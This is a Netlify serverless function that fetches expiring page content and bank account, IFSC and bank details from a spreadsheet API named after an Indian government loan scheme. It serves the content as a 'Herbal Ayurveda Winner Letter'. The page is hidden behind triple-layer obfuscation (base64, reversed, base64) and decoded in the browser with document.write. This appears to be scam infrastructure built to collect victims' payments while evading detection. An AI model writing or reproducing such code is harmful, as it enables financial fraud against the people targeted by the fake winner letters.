// netlify/functions/render.js
exports.handler = async function(event, context) {
  const expiryId = "TRL";
  const sheetbaseApiUrl = "https://sheetbase.co/api/pradhan_mantri_mudra_yojna/1s2x-KZ-dm0rRHGEoqNxbe06RBxQlkJXQdYIXn3La49U/sheet1/";
  const datetimeApiUrl  = "https://datetimeapi.vercel.app/api/datetime.js";

  try {
    // --- DATETIME ---
    const timeRes = await fetch(datetimeApiUrl);
    const tjson = await timeRes.json();
    const serverDatetime = tjson.datetime;

    // --- SHEETBASE ---
    const sheetRes = await fetch(sheetbaseApiUrl);
    const data = await sheetRes.json();

    let item = null;
    for (const entry of data.data) {
      if (entry.id === expiryId) item = entry;
    }
    if (!item) {
      return { statusCode: 404, body: "<h2>Entry missing</h2>" };
    }

    // expiry check
    if (new Date(serverDatetime) > new Date(item.date)) {
      return { statusCode: 200, body: "<h2>This Page is expired.</h2>" };
    }

    // Save decoded data into Netlify function memory
    global.__CSS__  = item.css  ? Buffer.from(item.css,  "base64").toString() : "";
    global.__JS__   = item.init ? Buffer.from(item.init, "base64").toString() : "";
    const decodedHTML = item.html ? Buffer.from(item.html, "base64").toString() : "";

    // Build HTML using linked CSS / JS
    const fullPage = `
<link rel='stylesheet' href="/.netlify/functions/style">
<script>
window.SERVER_EXPIRY = ${JSON.stringify(item.date)};
window.SERVER_TIME   = ${JSON.stringify(serverDatetime)};
window.SERVER_ACC    = ${JSON.stringify(item.acc ?? "")};
window.SERVER_IFSC   = ${JSON.stringify(item.ifsc ?? "")};
window.SERVER_BANK   = ${JSON.stringify(item.bank ?? "")};
</script>

<script src="/.netlify/functions/init"></script>

${decodedHTML}
`;

    // triple-layer encoding
    const layerA = Buffer.from(fullPage).toString("base64");
    const layerB = layerA.split('').reverse().join('');
    const layerC = Buffer.from(layerB).toString("base64");

    const finalHtml = `
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Herbal Ayurveda Winner Letter</title>
<script>
(function(){
    try {
        const payload = "${layerC}";
        const step1 = atob(payload);
        const step2 = step1.split('').reverse().join('');
        const finalHtml = atob(step2);
        document.open();
        document.write(finalHtml);
        document.close();
    } catch (e) {
        document.write("<h2>Decode error</h2>");
    }
})();
</script>
</head>
<body></body>
</html>`;

    return {
      statusCode: 200,
      headers: { "Content-Type": "text/html" },
      body: finalHtml
    };

  } catch(err) {
    return { statusCode: 500, body: "<h2>Server error</h2>" };
  }
};
